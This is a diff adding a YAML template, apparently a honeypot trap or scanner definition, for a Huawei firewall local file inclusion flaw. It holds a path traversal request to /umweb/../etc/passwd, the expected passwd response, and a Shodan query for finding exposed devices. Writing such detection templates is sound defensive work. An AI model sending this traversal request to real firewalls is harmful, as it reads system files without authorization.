@@ -1,0 +1,25 @@
+id: huawei-firewall-lfi
+info:
+  name: Huawei Firewall - Local File Inclusion
+  author: taielab
+  description: Huawei Firewall is vulnerable to LFI(Local File Inclusion)
+  severity: high
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: title:"HUAWEI"
+  tags: huawei,firewall,lfi
+traps:
+- request:
+    method: GET
+    path: /umweb/../etc/passwd
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: 'root:[x*]:0:0:'
